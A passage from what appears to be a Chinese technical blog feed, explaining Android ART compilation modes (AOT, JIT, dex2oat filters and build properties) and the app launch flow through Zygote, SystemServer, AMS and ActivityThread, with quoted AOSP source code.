        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>cmd<br>ART实际就是Android runtime的缩写，他是Android版本新的虚拟机</p><h3 id="诞生"><a href="#诞生" class="headerlink" title="诞生"></a>诞生</h3><p>ART 使用预先 (AOT) 编译，并且从 Android 7.0（代号 Nougat，简称 N）开始结合使用 AOT、即时 (JIT) 编译和配置文件引导型编译。</p><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><h4 id="1-预先编译"><a href="#1-预先编译" class="headerlink" title="1.预先编译"></a>1.预先编译</h4><p>ART模式与Dalvik模式最大的不同在于，在启用ART模式后，系统在安装应用的时候会进行一次预编译，在安装应用程序时会先将代码转换为机器语言存储在本地，这样在运行程序时就不会每次都进行一次编译了，执行效率也大大提升。并且对比dalvik，ART具有更严格的安装时验证。在安装时，ART 使用设备自带的 dex2oat 工具来编译应用。此实用工具接受 DEX 文件作为输入，并为目标设备生成经过编译的应用可执行文件。该工具应能够顺利编译所有有效的 DEX 文件。但是，一些后处理工具会生成无效文件，Dalvik 可以接受这些文件，但 ART 无法编译这些文件。</p><h4 id="2-垃圾回收（GC）时优化"><a href="#2-垃圾回收（GC）时优化" class="headerlink" title="2.垃圾回收（GC）时优化"></a>2.垃圾回收（GC）时优化</h4><p>垃圾回收 (GC) 会耗费大量资源，这可能有损于应用性能，导致显示不稳定、界面响应速度缓慢以及其他问题。ART 通过以下几种方式对垃圾回收做了优化：</p><ol><li>大多采用并发设计，具有一次 GC 暂停</li><li>并发复制，可减少后台内存使用和碎片</li><li>GC 暂停的时间不受堆大小影响</li><li>在清理最近分配的短时对象这种特殊情况中，回收器的总 GC 时间更短</li><li>优化了垃圾回收的工效，能够更加及时地进行并行垃圾回收，这使得 GC_FOR_ALLOC 事件在典型用例中极为罕见</li></ol><h4 id="3-开发和调试方面的优化"><a href="#3-开发和调试方面的优化" class="headerlink" title="3.开发和调试方面的优化"></a>3.开发和调试方面的优化</h4><p>ART 提供了大量功能来优化应用开发和调试。</p><p><strong>支持采样分析器</strong><br>一直以来，开发者都使用 Traceview 工具（用于跟踪应用执行情况）作为分析器。虽然 Traceview 可提供有用的信息，但每次方法调用产生的开销会导致 Dalvik 分析结果出现偏差，而且使用该工具明显会影响运行时性能。<br>ART 添加了对没有这些限制的专用采样分析器的支持，因而可更准确地了解应用执行情况，而不会明显减慢速度。KitKat 版本为 Dalvik 的 Traceview 添加了采样支持。</p><p><strong>支持更多调试功能</strong><br>ART 支持许多新的调试选项，特别是与监控和垃圾回收相关的功能。例如可以：</p><ol><li>查看堆栈跟踪中保留了哪些锁，然后跳转到持有锁的线程。</li><li>询问指定类的当前活动的实例数、请求查看实例，以及查看使对象保持有效状态的参考。</li><li>过滤特定实例的事件（如断点）。</li><li>查看方法退出（使用“method-exit”事件）时返回的值。</li><li>设置字段观察点，以在访问和/或修改特定字段时暂停程序执行。</li></ol><p><strong>优化了异常和崩溃报告中的诊断详细信息</strong><br>当发生运行时异常时，ART 会为您提供尽可能多的上下文和详细信息。ART 会提供 java.lang.ClassCastException、java.lang.ClassNotFoundException 和 java.lang.NullPointerException 的更多异常详细信息。（较高版本的 Dalvik 会提供 java.lang.ArrayIndexOutOfBoundsException 和 java.lang.ArrayStoreException 的更多异常详细信息，这些信息现在包括数组大小和越界偏移量；ART 也提供这类信息。）</p><h3 id="一些基本名词"><a href="#一些基本名词" class="headerlink" title="一些基本名词"></a>一些基本名词</h3><table><thead><tr><th>名称</th><th>详情</th></tr></thead><tbody><tr><td>dex文件</td><td>App所有java源代码编译后生成众多class文件，由DX/D8，编译为一个/多个（multiDex）dex文件，由Android虚拟机编译执行</td></tr><tr><td>odex文件</td><td>dex文件经过验证和优化后的产物，art下的odex文件包含经过AOT编译后的代码以及dex的完整内容，但Android8.0之后odex中的dex内容移动到了.vdex文件</td></tr><tr><td>art文件</td><td>art下根据配置文件生成odex文件时同时生成.art文件，主要是为了提升运行时加载odex中热点代码的速度，包含了类信息和odex中热点方法的索引，运行App时会首先根据这个文件来加载odex中已经编译过的代码；执行过speed-profile命令的app才会生成.art文件</td></tr><tr><td>JIT编译（Just In Time）</td><td>由于解释器方式运行太慢引入，对于频繁运行的热点代码（判定标准一般是在某个时间段内执行次数达到某个阈值）进行实时编译（在ART下以方法为粒度）执行，并且缓存JIT编译后的代码在内存中用于下次执行。由于以方法为粒度（ArtMethod）进行编译，JIT编译较于解释器可以生成效率更高的代码，运行更快</td></tr><tr><td>AOT编译（Ahead-Of-Time）</td><td>应用安装时全量编译所有代码为本地机器码，运行时直接执行机器码。</td></tr></tbody></table><p><strong>JIT编译与AOT编译对比</strong><br><strong>JIT编译</strong><br>优势:<br>1.能够根据当前硬件状况实时编译生成最优机器指令（ps. AOT 也能够作到，在用户使用是使用字节码根据机器状况在作一次编译）<br>2.能够根据当前程序的运行状况生成最优的机器指令序列<br>3.当程序须要支持动态连接时，只能使用 JIT<br>4.能够根据进程中内存的实际状况调整代码，使内存可以更充分的利用<br>劣势:<br>1.编译必须要占用线程资源，导致卡顿<br>2.因为编译时间须要占用运行时间，对于某些代码的编译优化不能彻底支持，须要在程序流畅和编译时间之间作权衡<br>3.在编译准备和识别频繁使用的方法须要占用时间，使得初始编译不能达到最高性能<br>4.由于 JIT Code Cache 是内存缓存，因此每次运行都需要重新编译</p><p><strong>AOT编译</strong><br>优势:<br>1.在程序运行前编译，能够避免在运行时的编译性能消耗和内存消耗<br>2.能够在程序运行初期就达到最高性能<br>3.能够显著的加快程序的启动<br>劣势:<br>1.应用安装和系统升级之后的应用优化比较耗时（重新编译，把程序代码转换成机器语言）<br>2.优化后的文件会占用额外的存储空间（缓存转换结果）</p><h3 id="运作方式"><a href="#运作方式" class="headerlink" title="运作方式"></a>运作方式</h3><h4 id="Android-4-4-7-0"><a href="#Android-4-4-7-0" class="headerlink" title="Android 4.4~7.0"></a>Android 4.4~7.0</h4><p>最开始ART只采用AOT编译，在App安装时就编译所有代码存储在本地，打开App直接运行，这样做的优点是应用运行速度变快，缺点也很明显，App安装时间明显变长，而且占用存储空间较大。</p><h4 id="Android-7-0"><a href="#Android-7-0" class="headerlink" title="Android 7.0"></a>Android 7.0</h4><p>Android N之后对于ART进行改动，重新引入了JIT编译，结合使用AOT/JIT混合编译，主要机制如下：<br>安装时不进行任何编译，前几次运行仅通过解释器解释运行，同时对热点代码进行JIT编译，并将这些代码的相关信息记录在一个配置文件里（data/misc/profile/cur/0/…）<br>设备处于空闲和充电状态时，编译守护进程读取配置文件对热点代码进行AOT编译并写入到app对应的odex文件中<br>再次启动应用后优先使用AOT编译过的代码，否则使用解释器+JIT编译，重复这个过程<br>对于一些庞大的APP，比如淘宝，有些功能可能你一辈子都不会用到，根据上述策略这部分代码就不会被编译保存，从而减少了存储空间的占用。另外，在系统升级时也避免了全量编译所有现存应用造成的时间空间消耗。</p><h4 id="Android-8-0"><a href="#Android-8-0" class="headerlink" title="Android 8.0"></a>Android 8.0</h4><p>Android 8.0引入了.vdex文件，它里面包含 APK 的未压缩 DEX 代码，以及一些用于加快验证速度的元数据。怎么理解呢？这里我们需要补充一下对dex文件的编译配置和系统ROM中各类应用的默认编译方式：<br>编译选项（compiler filters）：</p><ol><li>verify：只对 DEX 文件进行代码验证，校验各部分合法性。</li><li>quicken：在verify的基础上优化一些 DEX 指令，提升解释器性能。</li><li>speed：在verify的基础对所有方法进行 AOT 编译。</li><li>speed-profile：在verify的基础对配置文件中列出的方法（热点方法）进行 AOT 编译。</li></ol><p>系统ROM中各类应用默认编译方式：</p><ol><li>启动类路径代码（用于启动系统的部分代码）：默认使用 speed 编译过滤器进行编译</li><li>系统服务器代码（比如电量、多媒体服务代码）：默认使用 speed 编译过滤器进行编译</li><li>产品专属的核心应用（比如goole服务框架）：默认使用 speed 编译过滤器进行编译</li><li>所有第三方应用：默认使用 quicken 编译过滤器进行编译</li></ol><p>所有第三方应用最开始都是通过quiken模式只进行了dex校验和一些指令优化，.vdex文件存放的就是经过校验后的dex代码，以便在对热点代码进行AOT编译时避免重复验证，加快速度。</p><h3 id="混合编译的优势"><a href="#混合编译的优势" class="headerlink" title="混合编译的优势"></a>混合编译的优势</h3><ol><li>应用安装时间过长；在 N 之前，应用在安装时需要对所有 ClassN.dex 做 AOT 机器码编译，类似微信这种比较大型的 APP 可能会耗时数分钟。但是往往我们只会使用一个应用 20% 的功能，剩下的 80% 我们付出了时间成本，却没带来太大的收益。</li><li>降低占 ROM 空间；同样全量编译 AOT 机器码，12M 的 dex 编译结果往往可以达到 50M 之多。只编译用户用到或常用的 20% 功能，这对于存储空间不足的设备尤其重要。</li><li>提升系统与应用性能；减少了全量编译，降低了系统的耗电。在 boot.art 的基础上，每个应用增加了 base.art (这块后面会详细解析), 通过预加载与缓存提升应用性能。</li><li>快速的系统升级；以往厂商 ota 时，需要对安装的所有应用做全量的 AOT 编译，这耗时非常久。事实上，同样只有 20% 的应用是我们经常使用的，给不常用的应用，不常用的功能付出的这些成本是不值得的。</li></ol><p>综合下来，混合编译的模式因为在安装的时候不需要进行编译，安装速度会很快。在以后运行app时，会抓取热点数据进行存储并执行AOT编译优化体验。所以在前几次打开应用时速度会相对较慢，在操作次数多了后性能将会跟上。<br><strong>过滤器</strong><br>ART 如何编译 DEX 代码还有个compile filter以参数的形式来决定：从 Android O 开始，有四个官方支持的过滤器：</p><blockquote><p>verify：只运行 DEX 代码验证。<br>quicken：运行 DEX 代码验证，并优化一些 DEX 指令，以获得更好的解释器性能。<br>speed-profile：运行 DEX 代码验证，并对配置文件中列出的方法进行 AOT 编译。<br>speed：运行 DEX 代码验证，并对所有方法进行 AOT 编译。</p></blockquote><p>verify 和quicken 他俩都没执行编译，之后代码执行需要跑解释器。而speed-profile 和 speed 都执行了编译，区别是speed-profile根据profile记录的热点函数来编译，属于部分编译，而speed属于全编。<br>所以<br>执行效率上：<br>verify &lt; quicken &lt; speed-profile &lt; speed<br>编译速度上：<br>verify &gt; quicken &gt; speed-profile &gt; speed</p><h3 id="查看编译模式"><a href="#查看编译模式" class="headerlink" title="查看编译模式"></a>查看编译模式</h3><p>在命令行中输入adb getprop | grep pm.dex，可以查看当前手机在不同场景下的默认编译模式<br>一般用到的主要是这几个:</p><ul><li>ab-ota：系统升级，这里是使用A/B系统升级方式，也叫做无缝更新，A/B系统升级，顾名思义是有两个系统，在磁盘上开辟两个存储空间A/B存储空间，在升级过程中保证有一个可以正常运行的系统</li><li>bg-dexopt：后台编译</li><li>boot-after-ota：启动后升级</li><li>cmdline：命令行</li><li>first-boot：首次开机安装，google建议设置这个，避免开机的时间过长</li><li>inactive：不活跃的。这个不活跃状态也就是idle，判定是在frameworks/base/core/res/res/config.xml中有一个节点config_jobSchedulerInactivityIdleThreshold，默认值是1860000毫秒，也就是31分钟。31分钟处于非活动状态就会被认为是idle。</li><li>install：安装，设置为speed-profile可以在后续使用中提高应用启动时间，但是如果没有提供配置文件或者配置文件为空，那么启动时间会与verify没有区别<br>那么这个设置是在哪里进行配置的呢？</li></ul><p><strong>build/make/target/product/runtime_libart.mk</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># The install filter is speed-profile in order to enable the use of</span><br><span class="line"># profiles from the dex metadata files. Note that if a profile is not provided</span><br><span class="line"># or if it is empty speed-profile is equivalent to (quicken + empty app image).</span><br><span class="line"># Note that `cmdline` is not strictly needed but it simplifies the management</span><br><span class="line"># of compilation reason in the platform (as we have a unified, single path,</span><br><span class="line"># without exceptions).</span><br><span class="line">PRODUCT_SYSTEM_PROPERTIES += \</span><br><span class="line">    pm.dexopt.post-boot?=extract \</span><br><span class="line">    pm.dexopt.install?=speed-profile \</span><br><span class="line">    pm.dexopt.install-fast?=skip \</span><br><span class="line">    pm.dexopt.install-bulk?=speed-profile \</span><br><span class="line">    pm.dexopt.install-bulk-secondary?=verify \</span><br><span class="line">    pm.dexopt.install-bulk-downgraded?=verify \</span><br><span class="line">    pm.dexopt.install-bulk-secondary-downgraded?=extract \</span><br><span class="line">   pm.dexopt.bg-dexopt?=speed-profile \</span><br><span class="line">    pm.dexopt.ab-ota?=speed-profile \</span><br><span class="line">    pm.dexopt.inactive?=verify \</span><br><span class="line">    pm.dexopt.cmdline?=verify \</span><br><span class="line">    pm.dexopt.shared?=speed</span><br></pre></td></tr></table></figure><p>在这个文件里会提供一个没有frameworks的安装环境<br>User 版本会预先提取有source code的APK的odex文件，因为有source code的APK在 Android.mk中都会通过include $(BUILD_PACKAGE)来编译，会调用到package.mk来提取odex<br>但User版本不会预先提取通过prebuilt方式预置的APK的odex文件，因为采用prebuilt方式预置 APK是只有APK文件而没有source code时在Android.mk中通过 include $(BUILD_PREBUILT) 预置APK，代码中原本的prebuilt.mk中不会提取odex<br>user版本默认实现了apk预编译优化.如何实现不生成odex? 以下两种方式皆可</p><ol><li>通过修改build/make/core/board_config.mk中WITH_DEXPREOPT := false</li><li>在APK的Android.mk文件中添加 LOCAL_DEX_PREOPT := false 来关闭预优化</li></ol><h4 id="Dex2oat-选项"><a href="#Dex2oat-选项" class="headerlink" title="Dex2oat 选项"></a>Dex2oat 选项</h4><p>请注意，这些选项在设备编译期间以及预先优化期间都会影响 dex2oat，但是前面讨论的大多数选项都只会影响预先优化。<br>在 dex2oat 编译启动映像时对其进行控制：</p><ul><li>dalvik.vm.image-dex2oat-Xms：初始堆大小</li><li>dalvik.vm.image-dex2oat-Xmx：最大堆大小</li><li>dalvik.vm.image-dex2oat-filter：编译过滤器选项</li><li>dalvik.vm.image-dex2oat-threads：要使用的线程数</li></ul><p>在 dex2oat 编译除启动映像之外的所有内容时对其进行控制：</p><ul><li>dalvik.vm.dex2oat-Xms：初始堆大小</li><li>dalvik.vm.dex2oat-Xmx：最大堆大小</li><li>dalvik.vm.dex2oat-filter：编译过滤器选项</li></ul><p>Android 6.0 之前的版本提供了一个适用于编译除启动映像之外的所有内容的附加选项：</p><ul><li>dalvik.vm.dex2oat-threads：要使用的线程数</li></ul><p>从 Android 6.1 开始，该选项变成了两个适用于编译除启动映像之外的所有内容的附加选项：</p><ul><li>dalvik.vm.boot-dex2oat-threads：启动时要使用的线程数</li><li>dalvik.vm.dex2oat-threads：启动后要使用的线程数</li></ul><p>Android 7.1 及之后的版本提供了两个选项来控制编译除启动映像之外的所有内容时的内存使用方式：</p><ul><li>dalvik.vm.dex2oat-very-large：停用 AOT 编译的最小总 dex 文件大小（以字节为单位）</li><li>dalvik.vm.dex2oat-swap：使用 dex2oat 交换文件（用于低内存设备）</li></ul><p>不应减小用于控制 dex2oat 初始堆大小和最大堆大小的选项数值，因为它们可能会限制可对哪些应用进行编译。<br>从 Android 11 开始，我们提供了 3 个 CPU 亲和性选项，通过这些选项，编译器线程可以限定在特定的一组 CPU 上：</p><ul><li>dalvik.vm.boot-dex2oat-cpu-set：在启动时运行 dex2oat 线程的 CPU</li><li>dalvik.vm.image-dex2oat-cpu-set：在编译启动映像时运行 dex2oat 的 CPU</li><li>dalvik.vm.dex2oat-cpu-set：在启动后运行 dex2oat 线程的 CPU</li></ul><h4 id="单独APP安装模式"><a href="#单独APP安装模式" class="headerlink" title="单独APP安装模式"></a>单独APP安装模式</h4><p>搜索app包下device.mk文件查找PRODUCT_DEXPREOPT_SPEED_APPS属性<br>例如device/google/coral/device.mk文件下就有这样一个属性</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Preopt SystemUI</span><br><span class="line">PRODUCT_DEXPREOPT_SPEED_APPS += SystemUIGoogle  # For internal</span><br><span class="line">PRODUCT_DEXPREOPT_SPEED_APPS += SystemUI  # For AOSP</span><br></pre></td></tr></table></figure><p>单独为systemUI设置了speed编译模式</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android APP启动流程解析</title>
      <link href="/2024/01/13/2024-01-13/"/>
      <url>/2024/01/13/2024-01-13/</url>
      
        <content type="html"><![CDATA[<h2 id="手机启动"><a href="#手机启动" class="headerlink" title="手机启动"></a>手机启动</h2><p>Android手机在开机Linux内核启动的时候，会加载system/core/init/init.rc文件，启动init进程，这个是Android特有的初始化程序，主要负责</p><ul><li>各种复杂工作</li><li>负责开关机画面</li><li>文件系统的创建和挂载</li><li>启动Zygote(孵化器)进程</li><li>启动ServiceManager，它是Binder服务管理器，管理所有Android系统服务</li></ul><h3 id="fork-Zygote"><a href="#fork-Zygote" class="headerlink" title="fork Zygote"></a>fork Zygote</h3><p>在启动init进程后会fork Zygote进程，它是一个孵化器进程，它的main函数会创建好环境并且等待孵化，接到指令后就会开始fork子进程<br>创建一个server端的socket， name为zynote，用于和客户端进程通信<br>预加载类和资源，提高应用启动速度<br>启动SystemServer进程<br>监听socket，当有一个应用程序启动时，就会向它发出请求，然后zygote进程fock自己来创建的一个新的子进程。<br>所以说Android内所有的应用其实都是Zygote的子进程</p><h3 id="SystemServer"><a href="#SystemServer" class="headerlink" title="SystemServer"></a>SystemServer</h3><p>SystemServer是由zygote进程fork出来的第一个进程，SystemServer和Zygote是Android Framework最重要的2个进程。 系统里面重要的服务都是在这个进程里面开启的，比如ActivityManagerService（AMS）、PackageManagerService（PMS）、WindowManagerService（WMS）。<br>应用启动流程基本是围绕着ActivityManagerService和ActivityThread展开。<br>并且负责启动并且管理整个framework。<br>ActivityManagerService<br>ActivityManagerService，简称AMS，服务端对象，负责系统中所有Activity的生命周期。<br>并且他在SystemServer进程开启的时候，就会直接跟着一起初始化</p><h3 id="应用启动"><a href="#应用启动" class="headerlink" title="应用启动"></a>应用启动</h3><h4 id="涉及进程"><a href="#涉及进程" class="headerlink" title="涉及进程"></a>涉及进程</h4><p>Android开发中，我们可以通过Package包名和Activity类名，来打开一个APP。实际上，项目里的业务代码startActivity()方法并不是直接创建进程、拉起APP的。而是通过一系列的调用，把请求传递给SystemServer的AMS。AMS收到来自客户端的请求后，再通知zygote进程来fork一个新进程，来开启我们的目标APP。APP中所有Activity的生命周期过程，都由AMS（SystemServer进程）统一调度，并在APP自身进程中具体完成。<br>所以打开应用总共涉及了三个进程：Zygote进程、AMS进程、APP进程<br>App进程与AMS通过Binder机制进行跨进程通信<br>AMS(SystemServer进程)与zygote通过Socket进行跨进程通信。<br>在Android系统中，任何一个Activity的启动都是由AMS和App进程（主要是ActivityThread）相互配合来完成的。AMS服务统一调度系统中所有进程的Activity启动，而每个Activity的启动过程则由其所属的进程具体来完成。</p><h4 id="启动步骤"><a href="#启动步骤" class="headerlink" title="启动步骤"></a>启动步骤</h4><ol><li>activity中的startActivity方法最终都会通过拿到ATSM的代理IActivityTaskManager调用的startActivity;</li><li>之后进入system server进程中的ATMS startActivity，ATMS 经过收集Intent信息，然后使用ActivityStackSupervisor.startSpecificActivityLocked，如果进程已经存在，则直接使用realStartActivityLocked，通过App的binder客户端的代理ApplicationThread调用回到bindApplication，走入Activity的启动流程;如果进程不存在则通过socket链接Zygote，请求fork新的进程;</li><li>App进程创建完成后，进程启动会调用ActivityThread.main方法，初始化主线程Handler,接着走入attach方法，然后通过AMS的代理调用AMS的attachApplication方法，并将App进程的通信代理ApplicationThread传入AMS;</li><li>AMS获取到ATMS调用ApplicationThread的bindApplication回到App进程的ActivityThread.ApplicationThread.bindApplication方法中，然后使用Handler切换到主线程执行handleBindApplication，这里初始化了App的进程名字、时间，用户的硬件配置，包括App的文件系统，创建了App的Context实例，Instrumentation实例，调用App的onCreate回调方法，同时告诉AMS APP初始化工作完毕;</li><li>AMS接着会调用ATMS的attachApplication，最后调用ClientLifecycleManager的scheduleTransaction方法，通过App的Binder代理ApplicationThread回到ActivityThread;</li><li>进入ActivityThread.ApplicationThread.scheduleTransaction方法之后就进入了Activity的onStart、onResume回调</li></ol><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><h4 id="ActivityThread"><a href="#ActivityThread" class="headerlink" title="ActivityThread"></a>ActivityThread</h4><p>一个应用，在被点击后首先要fork出一个Zygote进程，接下来执行ActivityThread.main<br><strong>frameworks/base/core/java/android/app/ActivityThread.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123; </span><br><span class="line">    <span class="type">ActivityThread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActivityThread</span>(); </span><br><span class="line">    thread.attach(<span class="literal">false</span>, startSeq); </span><br><span class="line">    <span class="keyword">if</span> (sMainThreadHandler == <span class="literal">null</span>) &#123; </span><br><span class="line">        sMainThreadHandler = thread.getHandler(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span>) &#123; </span><br><span class="line">        Looper.myLooper().setMessageLogging(<span class="keyword">new</span> </span><br><span class="line">                <span class="title class_">LogPrinter</span>(Log.DEBUG, <span class="string">&quot;ActivityThread&quot;</span>)); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// End of event ActivityThreadMain. </span></span><br><span class="line">    Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER); </span><br><span class="line">    Looper.loop(); </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Main thread loop unexpectedly exited&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后调用ActivityThread的attach方法，然后将activity和AMS通信的Binder代理IApplicationThread实例传入AMS<br><strong>frameworks/base/core/java/android/app/ActivityThread.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@UnsupportedAppUsage</span> </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">attach</span><span class="params">(<span class="type">boolean</span> system, <span class="type">long</span> startSeq)</span> &#123; </span><br><span class="line">    sCurrentActivityThread = <span class="built_in">this</span>; </span><br><span class="line">    mSystemThread = system; </span><br><span class="line">    <span class="keyword">if</span> (!system) &#123; </span><br><span class="line">        android.ddm.DdmHandleAppName.setAppName(<span class="string">&quot;&lt;pre-initialized&gt;&quot;</span>, </span><br><span class="line">                                                UserHandle.myUserId()); </span><br><span class="line">        RuntimeInit.setApplicationObject(mAppThread.asBinder()); </span><br><span class="line">        <span class="keyword">final</span> <span class="type">IActivityManager</span> <span class="variable">mgr</span> <span class="operator">=</span> ActivityManager.getService(); </span><br><span class="line">        <span class="keyword">try</span> &#123; </span><br><span class="line">            mgr.attachApplication(mAppThread, startSeq); </span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException ex) &#123; </span><br><span class="line">            <span class="keyword">throw</span> ex.rethrowFromSystemServer(); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">// Watch for getting close to heap limit. </span></span><br><span class="line">        BinderInternal.addGcWatcher(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123; </span><br><span class="line">            <span class="meta">@Override</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123; </span><br><span class="line">                <span class="keyword">if</span> (!mSomeActivitiesChanged) &#123; </span><br><span class="line">                    <span class="keyword">return</span>; </span><br><span class="line">                &#125; </span><br><span class="line">                <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); </span><br><span class="line">                <span class="type">long</span> <span class="variable">dalvikMax</span> <span class="operator">=</span> runtime.maxMemory(); </span><br><span class="line">                <span class="type">long</span> <span class="variable">dalvikUsed</span> <span class="operator">=</span> runtime.totalMemory() - runtime.freeMemory(); </span><br><span class="line">                <span class="keyword">if</span> (dalvikUsed &gt; ((<span class="number">3</span>*dalvikMax)/<span class="number">4</span>)) &#123; </span><br><span class="line">                    <span class="keyword">if</span> (DEBUG_MEMORY_TRIM) Slog.d(TAG, <span class="string">&quot;Dalvik max=&quot;</span> + (dalvikMax/<span class="number">1024</span>) </span><br><span class="line">                            + <span class="string">&quot; total=&quot;</span> + (runtime.totalMemory()/<span class="number">1024</span>) </span><br><span class="line">                            + <span class="string">&quot; used=&quot;</span> + (dalvikUsed/<span class="number">1024</span>)); </span><br><span class="line">                    mSomeActivitiesChanged = <span class="literal">false</span>; </span><br><span class="line">                    <span class="keyword">try</span> &#123; </span><br><span class="line">                        ActivityTaskManager.getService().releaseSomeActivities(mAppThread); </span><br><span class="line">                    &#125; <span class="keyword">catch</span> (RemoteException e) &#123; </span><br><span class="line">                        <span class="keyword">throw</span> e.rethrowFromSystemServer(); </span><br><span class="line">                    &#125; </span><br><span class="line">                &#125; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;); </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="AMS"><a href="#AMS" class="headerlink" title="AMS"></a>AMS</h4><p>接着进入AMS进程，ActivityManagerService.attachApplicationLocked<br><strong>frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">attachApplicationLocked</span><span class="params">(IApplicationThread thread, </span></span><br><span class="line"><span class="params">        <span class="type">int</span> pid, <span class="type">int</span> callingUid, <span class="type">long</span> startSeq)</span> &#123; </span><br><span class="line">        <span class="keyword">if</span> (app.isolatedEntryPoint != <span class="literal">null</span>) &#123; </span><br><span class="line">            <span class="comment">// This is an isolated process which should just call an entry point instead of </span></span><br><span class="line">            <span class="comment">// being bound to an application. </span></span><br><span class="line">            thread.runIsolatedEntryPoint(app.isolatedEntryPoint, app.isolatedEntryPointArgs); </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (instr2 != <span class="literal">null</span>) &#123; </span><br><span class="line">            thread.bindApplication(processName, appInfo, providers, </span><br><span class="line">                    instr2.mClass, </span><br><span class="line">                    profilerInfo, instr2.mArguments, </span><br><span class="line">                    instr2.mWatcher, </span><br><span class="line">                    instr2.mUiAutomationConnection, testMode, </span><br><span class="line">                    mBinderTransactionTrackingEnabled, enableTrackAllocation, </span><br><span class="line">                    isRestrictedBackupMode || !normalMode, app.isPersistent(), </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Configuration</span>(app.getWindowProcessController().getConfiguration()), </span><br><span class="line">                    app.compat, getCommonServicesLocked(app.isolated), </span><br><span class="line">                    mCoreSettingsObserver.getCoreSettingsLocked(), </span><br><span class="line">                    buildSerial, autofillOptions, contentCaptureOptions); </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            thread.bindApplication(processName, appInfo, providers, <span class="literal">null</span>, profilerInfo, </span><br><span class="line">                    <span class="literal">null</span>, <span 